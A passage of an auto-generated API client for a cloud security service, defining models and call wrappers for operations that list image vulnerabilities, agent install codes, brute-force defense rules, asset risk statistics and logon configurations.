      modifyTs?: long(name='ModifyTs', description='The timestamp when the information about the vulnerability was updated. Unit: milliseconds.', example='1580808765000'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
      namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
      necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
      pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
      primaryId?: long(name='PrimaryId', description='The ID of the vulnerability.', example='782661'),
      related?: string(name='Related', description='The Common Vulnerabilities and Exposures (CVE) ID of the associated vulnerability.', example='CVE-2019-9893'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='varnish'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='default'),
      scanTime?: long(name='ScanTime'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **1**: unfixed
*   **7**: fixed', example='1'),
      tag?: string(name='Tag', description='The tag that is added to the vulnerability.', example='oval'),
      targetId?: string(name='TargetId'),
      targetName?: string(name='TargetName'),
      targetType?: string(name='TargetType'),
      type?: string(name='Type', description='The type of the vulnerability. The value is fixed as CVE, which indicates image vulnerabilities.', example='cve'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='0004a32a0305a7f6ab5ff9600d47****'),
    }
  ](name='VulRecords', description='An array that consists of the vulnerabilities.'),
}

model DescribeImageVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageVulListResponseBody(name='body'),
}

/**
  * To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
  *
  * @param request DescribeImageVulListRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeImageVulListResponse
 */
async function describeImageVulListWithOptions(request: DescribeImageVulListRequest, runtime: Util.RuntimeOptions): DescribeImageVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.digest)) {
    query['Digest'] = request.digest;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.tag)) {
    query['Tag'] = request.tag;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * To query the information about the recently detected image vulnerabilities, call the [PublicCreateImageScanTask](~~PublicCreateImageScanTask~~) operation. Wait 1 to 5 minutes until the call is successful and call the DescribeImageVulList operation.
  *
  * @param request DescribeImageVulListRequest
  * @return DescribeImageVulListResponse
 */
async function describeImageVulList(request: DescribeImageVulListRequest): DescribeImageVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageVulListWithOptions(request, runtime);
}

model DescribeInstallCaptchaRequest {
  deadline?: string(name='Deadline', description='The validity period of the installation verification code. If this parameter is not specified, the validity period is 1 hour.

>  The installation verification code is valid only within the validity period. An expired installation verification code cannot be used to install the agent.', example='2020-10-11 16:26:22'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeInstallCaptchaResponseBody = {
  captchaCode?: string(name='CaptchaCode', description='The installation verification code for you to manually install the Security Center agent.', example='M1HH**'),
  deadline?: string(name='Deadline', description='The validity period of the installation verification code.

>  The installation verification code is valid only within the validity period. An expired installation verification code cannot be used to install the agent.', example='2020-10-10 16:06:38'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeInstallCaptchaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCaptchaResponseBody(name='body'),
}

async function describeInstallCaptchaWithOptions(request: DescribeInstallCaptchaRequest, runtime: Util.RuntimeOptions): DescribeInstallCaptchaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.deadline)) {
    query['Deadline'] = request.deadline;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstallCaptcha',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCaptcha(request: DescribeInstallCaptchaRequest): DescribeInstallCaptchaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCaptchaWithOptions(request, runtime);
}

model DescribeInstallCodeResponseBody = {
  code?: string(name='Code'),
  requestId?: string(name='RequestId'),
}

model DescribeInstallCodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodeResponseBody(name='body'),
}

async function describeInstallCodeWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCode(): DescribeInstallCodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodeWithOptions(runtime);
}

model DescribeInstallCodesResponseBody = {
  installCodes?: [ 
    {
      captchaCode?: string(name='CaptchaCode'),
      expiredDate?: long(name='ExpiredDate'),
      groupId?: long(name='GroupId'),
      groupName?: string(name='GroupName'),
      onlyImage?: boolean(name='OnlyImage'),
      os?: string(name='Os'),
      vendorName?: string(name='VendorName'),
    }
  ](name='InstallCodes'),
  requestId?: string(name='RequestId'),
}

model DescribeInstallCodesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstallCodesResponseBody(name='body'),
}

async function describeInstallCodesWithOptions(runtime: Util.RuntimeOptions): DescribeInstallCodesResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeInstallCodes',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstallCodes(): DescribeInstallCodesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstallCodesWithOptions(runtime);
}

model DescribeInstanceAntiBruteForceRulesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10000**.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='115.238.XX.XX'),
  uuidList?: [ string ](name='UuidList', description='An array that consists of the UUIDs of the servers.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.'),
}

model DescribeInstanceAntiBruteForceRulesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of servers to which the defense rule is applied on the current page.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of servers to which the defense rule is applied.', example='4'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='97286A-4A6B-4A4-95FA-EC7E3E2451'),
  rules?: [ 
    {
      id?: long(name='Id', description='The ID of the defense rule.', example='215779601'),
      name?: string(name='Name', description='The name of the defense rule.', example='TestRule'),
      uuid?: string(name='Uuid', description='The UUID of the server to which the defense rule is applied.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='Rules', description='An array consisting of the servers to which the defense rule is applied.'),
}

model DescribeInstanceAntiBruteForceRulesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceAntiBruteForceRulesResponseBody(name='body'),
}

async function describeInstanceAntiBruteForceRulesWithOptions(request: DescribeInstanceAntiBruteForceRulesRequest, runtime: Util.RuntimeOptions): DescribeInstanceAntiBruteForceRulesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceAntiBruteForceRules',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceAntiBruteForceRules(request: DescribeInstanceAntiBruteForceRulesRequest): DescribeInstanceAntiBruteForceRulesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceAntiBruteForceRulesWithOptions(request, runtime);
}

model DescribeInstanceRebootStatusRequest {
  uuids?: string(name='Uuids', description='The UUIDs of the servers that you restart. Separate multiple UUIDs with commas (,).', example='d77f7802-4f0a-4221-ab02-4d999e****'),
}

model DescribeInstanceRebootStatusResponseBody = {
  rebootStatuses?: [ 
    {
      code?: string(name='Code', description='The error code that is returned when the server failed to be restarted. Valid values:

*   **10001**: The restart command failed to be sent.
*   **10002**: The restart operation failed.
*   **10003**: A timeout error occurs.', example='10001'),
      msg?: string(name='Msg', description='The message that is returned when the server failed to be restarted.', example='push failed'),
      rebootStatus?: int32(name='RebootStatus', description='The status of the server. Valid values:

*   **0**: The server is being restarted.
*   **1**: The server is restarted.
*   **2**: The server failed to be restarted.', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='9b59c2d6-0967-46e3-ad7b-152227c****'),
    }
  ](name='RebootStatuses', description='An array that consists of the status information about the servers that you restart.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeInstanceRebootStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceRebootStatusResponseBody(name='body'),
}

async function describeInstanceRebootStatusWithOptions(request: DescribeInstanceRebootStatusRequest, runtime: Util.RuntimeOptions): DescribeInstanceRebootStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceRebootStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceRebootStatus(request: DescribeInstanceRebootStatusRequest): DescribeInstanceRebootStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceRebootStatusWithOptions(request, runtime);
}

model DescribeInstanceStatisticsRequest {
  from?: string(name='From', description='The source of the request. Set the value to **sas**, which indicates that the request is sent from Security Center.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUIDs of the assets to query. Separate multiple UUIDs with commas (,).
> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of assets.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
}

model DescribeInstanceStatisticsResponseBody = {
  data?: [ 
    {
      account?: int32(name='Account', description='The number of unusual logons to the asset.', example='0'),
      agentlessAll?: int32(name='AgentlessAll', description='The number of alerts generated by the agentless detection feature.', example='13'),
      agentlessBaseline?: int32(name='AgentlessBaseline', description='The number of baseline risks detected by the agentless detection feature.', example='2'),
      agentlessMalicious?: int32(name='AgentlessMalicious', description='The number of malicious samples detected by the agentless detection feature.', example='3'),
      agentlessVulCve?: int32(name='AgentlessVulCve', description='The number of system vulnerabilities detected by the agentless detection feature.', example='1'),
      agentlessVulSca?: int32(name='AgentlessVulSca', description='The number of application vulnerabilities detected by the agentless detection feature.', example='1'),
      appNum?: int32(name='AppNum', description='The number of application vulnerabilities detected on the asset.', example='1'),
      cmsNum?: int32(name='CmsNum', description='The number of Web-CMS vulnerabilities detected on the asset.', example='5'),
      cveNum?: int32(name='CveNum', description='The number of common vulnerabilities detected on the asset.', example='1'),
      emgNum?: int32(name='EmgNum', description='The number of urgent vulnerabilities detected on the asset.', example='6'),
      health?: int32(name='Health', description='The number of baseline risks detected on the asset.', example='2'),
      scaNum?: int32(name='ScaNum', description='The number of middleware vulnerabilities detected on the asset.', example='1'),
      suspicious?: int32(name='Suspicious', description='The number of alerts generated on the asset.', example='2'),
      sysNum?: int32(name='SysNum', description='The number of Windows system vulnerabilities detected on the asset.', example='3'),
      trojan?: int32(name='Trojan', description='The number of trojans detected on the asset.', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
      vul?: int32(name='Vul', description='The total number of vulnerabilities detected on the asset.', example='17'),
      weakPWNum?: int32(name='WeakPWNum', description='The number of weak passwords.', example='22'),
    }
  ](name='Data', description='An array that consists of the risk information about assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8F035A9D-D19F-5430-8CA5-1497991B7C61'),
}

model DescribeInstanceStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeInstanceStatisticsResponseBody(name='body'),
}

async function describeInstanceStatisticsWithOptions(request: DescribeInstanceStatisticsRequest, runtime: Util.RuntimeOptions): DescribeInstanceStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeInstanceStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeInstanceStatistics(request: DescribeInstanceStatisticsRequest): DescribeInstanceStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeInstanceStatisticsWithOptions(request, runtime);
}

model DescribeIpTagsRequest {
  ip?: string(name='Ip', example='192.168.XX.XX'),
  securityEventId?: string(name='SecurityEventId', example='11'),
}

model DescribeIpTagsResponseBody = {
  requestId?: string(name='RequestId', example='E70074C8-DFB4-44C5-96C7-909DXXXXXXX'),
  tags?: string(name='Tags', example='latest'),
}

model DescribeIpTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeIpTagsResponseBody(name='body'),
}

async function describeIpTagsWithOptions(request: DescribeIpTagsRequest, runtime: Util.RuntimeOptions): DescribeIpTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ip)) {
    query['Ip'] = request.ip;
  }
  if (!Util.isUnset(request.securityEventId)) {
    query['SecurityEventId'] = request.securityEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeIpTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeIpTags(request: DescribeIpTagsRequest): DescribeIpTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeIpTagsWithOptions(request, runtime);
}

model DescribeLatestScanTaskResponseBody = {
  lastCheckTime?: long(name='LastCheckTime', example='1671610264000'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
  riskNum?: int32(name='RiskNum', example='1'),
  targetInfo?: string(name='TargetInfo', example='[{"type":"uuid","name":"Host001","target":"503201a7-14c6-4280-801b-1169ed42****"}]'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeLatestScanTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLatestScanTaskResponseBody(name='body'),
}

async function describeLatestScanTaskWithOptions(runtime: Util.RuntimeOptions): DescribeLatestScanTaskResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLatestScanTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLatestScanTask(): DescribeLatestScanTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLatestScanTaskWithOptions(runtime);
}

model DescribeLogMetaRequest {
  from?: string(name='From', description='The ID of the request source. Default value: **aegis**. Valid values:

*   **aegis**: Server Guard
*   **sas**: Security Center

>  If you use Server Guard, set the value to **aegis**. If you use Security Center, set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='123.168.XX.XX'),
}

model DescribeLogMetaResponseBody = {
  logMetaList?: [ 
    {
      category?: string(name='Category', description='The category of logs. Valid values:

*   **host**: host logs
*   **network**: network logs
*   **security**: security logs', example='host'),
      hotTtl?: int32(name='HotTtl', description='The time period after which logs in hot storage are moved to cold storage. Unit: days.

>  If the value is **-1**, logs that are stored in hot storage are not moved to cold storage.', example='-1'),
      logDesc?: string(name='LogDesc', description='The name of the log type.', example='Login'),
      logStore?: string(name='LogStore', description='The name of the dedicated Logstore in which logs are stored.', example='aegis-log-login'),
      project?: string(name='Project', description='The name of the project.', example='aegis-log'),
      status?: string(name='Status', description='The status of the log analysis feature. Valid values:

*   **disabled**
*   **enabled**', example='enabled'),
      topic?: string(name='Topic', description='The topic of logs that are delivered.', example='aegis-log-login'),
      ttl?: int32(name='Ttl', description='The number of days during which logs can be retained.', example='180'),
      userLogStore?: string(name='UserLogStore', description='The name of the dedicated Logstore in which user logs are stored.', example='aegis-log-network'),
      userProject?: string(name='UserProject', description='The name of the dedicated project in which logs are stored.', example='sasnew-log-XXXX-cn-hangzhou'),
      userRegion?: string(name='UserRegion', description='The ID of the region.', example='cn-hangzhou'),
    }
  ](name='LogMetaList', description='An array that consists of the configurations of the log analysis feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA04B21'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
}

model DescribeLogMetaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogMetaResponseBody(name='body'),
}

async function describeLogMetaWithOptions(request: DescribeLogMetaRequest, runtime: Util.RuntimeOptions): DescribeLogMetaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogMeta',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogMeta(request: DescribeLogMetaRequest): DescribeLogMetaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogMetaWithOptions(request, runtime);
}

model DescribeLogShipperStatusRequest {
  from?: string(name='From', example='sas'),
}

model DescribeLogShipperStatusResponseBody = {
  logShipperStatus?: {
    authStatus?: string(name='AuthStatus', example='yes'),
    buyStatus?: string(name='BuyStatus', example='yes'),
    openStatus?: string(name='OpenStatus', example='yes'),
    postPaidOpenStatus?: string(name='PostPaidOpenStatus', example='no'),
    postPaidSupportStatus?: string(name='PostPaidSupportStatus', example='yes'),
    slsProjectStatus?: string(name='SlsProjectStatus', example='Normal'),
    slsServiceStatus?: string(name='SlsServiceStatus', example='yes'),
  }(name='LogShipperStatus'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeLogShipperStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLogShipperStatusResponseBody(name='body'),
}

async function describeLogShipperStatusWithOptions(request: DescribeLogShipperStatusRequest, runtime: Util.RuntimeOptions): DescribeLogShipperStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLogShipperStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLogShipperStatus(request: DescribeLogShipperStatusRequest): DescribeLogShipperStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLogShipperStatusWithOptions(request, runtime);
}

model DescribeLoginBaseConfigsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **5**.', example='5'),
  target?: string(name='Target', description='The server to which the configuration is applied. The value of this parameter is in the JSON format and contains the following fields:

*   **Target**: the UUID or group ID of the server to add or delete.

>  If targetType is set to uuid, the value of Target is the UUID of the server. If targetType is set to groupId, the value of Target is the group ID of the server. If targetType is set to global, the value of Target is a hyphen (-).

*   **targetType**: the type of the server to which the configuration is applied. Valid values:

    *   **uuid**: a server
    *   **groupId**: a server group
    *   **global**: all servers', example='[ {"target": "inet-7c676676-06fa-442e-90fb-b802e5d6****", "targetType": "uuid" } ]'),
  type?: string(name='Type', description='The logon type of the configuration to query. Valid values:

*   **login\\_common_location**: common logon location
*   **login\\_common_ip**: common logon IP address
*   **login\\_common_time**: common logon time range
*   **login\\_common_account**: common logon account', example='login_common_location'),
}

model DescribeLoginBaseConfigsResponseBody = {
  baseConfigs?: [ 
    {
      account?: string(name='Account', description='The common logon account.', example='1582318****'),
      endTime?: string(name='EndTime', description='The end time of the common logon time range.', example='07:00'),
      ip?: string(name='Ip', description='The common logon IP address.', example='192.168.XX.XX'),
      location?: string(name='Location', description='The common logon location.', example='Montenegro'),
      startTime?: string(name='StartTime', description='The start time of the common logon time range.', example='08:00'),
      targetList?: [ 
        {
          target?: string(name='Target', description='The UUID or group ID of the server.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The type of the server to which the configuration is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group
*   **global**: all servers', example='uuid'),
        }
      ](name='TargetList', description='The details of the servers to which the configuration is applied.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='172'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configuration is applied.', example='13'),
    }
  ](name='BaseConfigs', description='An array that consists of the information about the configurations.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C2D4B3C-0524-17B1-93D2-DA50119F4E1E'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='200'),
}

model DescribeLoginBaseConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginBaseConfigsResponseBody(name='body'),
}

async function describeLoginBaseConfigsWithOptions(request: DescribeLoginBaseConfigsRequest, runtime: Util.RuntimeOptions): DescribeLoginBaseConfigsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeLoginBaseConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeLoginBaseConfigs(request: DescribeLoginBaseConfigsRequest): DescribeLoginBaseConfigsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeLoginBaseConfigsWithOptions(request, runtime);
}

model DescribeLoginSwitchConfigsResponseBody = {
  configList?: [ 
    {
      item?: string(name='Item', example='login_common_ip'),
      status?: int32(name='Status', example='0'),
    }
  ](name='ConfigList'),
  count?: int32(name='Count', example='2'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeLoginSwitchConfigsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeLoginSwitchConfigsResponseBody(name='body'),
}

async function describeLoginSwitchConfigsWithOptions(runtime: Util.RuntimeOptions): DescribeLoginSwitchConfigsResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeLoginSwitchConfigs',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
